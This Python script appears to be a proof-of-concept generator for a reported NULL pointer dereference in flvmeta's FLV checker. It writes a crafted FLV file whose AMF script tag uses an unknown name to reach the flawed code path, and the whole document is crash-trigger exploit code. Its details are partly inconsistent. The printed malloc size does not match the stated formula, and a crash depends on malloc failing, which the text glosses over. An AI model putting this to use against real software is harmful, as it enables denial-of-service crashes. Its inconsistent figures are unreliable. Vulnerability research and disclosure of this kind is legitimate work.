#!/usr/bin/env python3
"""
VULN 002 PoC Generator
CWE-476: NULL Pointer Dereference in check_flv_file() / check.c:659-661

Trigger: flvmeta --check processes a Script tag whose AMF name is NOT one of
the three known values (onMetaData, onCuePoint, onLastSecond).
The code does malloc(len+50) without checking NULL before sprintf().

This script creates a minimal valid FLV containing a Script tag whose AMF
string name is "onCustomFuzzer" -- guaranteed to reach the vulnerable path.
"""
import struct
import os

OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_002.flv")

# ---- AMF0 payload ----
# 1. AMF0 string (type 0x02): "onCustomFuzzer"
name = b"onCustomFuzzer"
amf_string = b"\x02" + struct.pack(">H", len(name)) + name  # 3 + 14 = 17 bytes

# 2. AMF0 ECMA array (type 0x08): empty, with end-of-object terminator
#    count (4 bytes) = 0, then end tag: 0x00 0x00 0x09
amf_ecma = b"\x08" + struct.pack(">I", 0) + b"\x00\x00\x09"  # 1+4+3 = 8 bytes

amf_data = amf_string + amf_ecma  # 25 bytes

# ---- Script tag ----
tag_type = b"\x12"
data_size = struct.pack(">I", len(amf_data))[1:]  # 3-byte BE
timestamp = b"\x00\x00\x00"
timestamp_ext = b"\x00"
stream_id = b"\x00\x00\x00"

script_tag = tag_type + data_size + timestamp + timestamp_ext + stream_id + amf_data

tag_total_size = 11 + len(amf_data)  # FLV_TAG_SIZE=11 + body

# ---- FLV file ----
flv_header = b"FLV" + b"\x01" + b"\x05" + struct.pack(">I", 9)   # 9-byte header
prev_tag_size_0 = struct.pack(">I", 0)
prev_tag_size_1 = struct.pack(">I", tag_total_size)

flv = flv_header + prev_tag_size_0 + script_tag + prev_tag_size_1

with open(OUTPUT, "wb") as f:
    f.write(flv)

print(f"[+] Written {len(flv)} bytes to {OUTPUT}")
print(f"    AMF name: {name.decode()!r}")
print(f"    Tag body size: {len(amf_data)} bytes")
print(f"    malloc() target size: {len(amf_data) - 8 + 50} bytes (name_len={len(name)} + 50)")
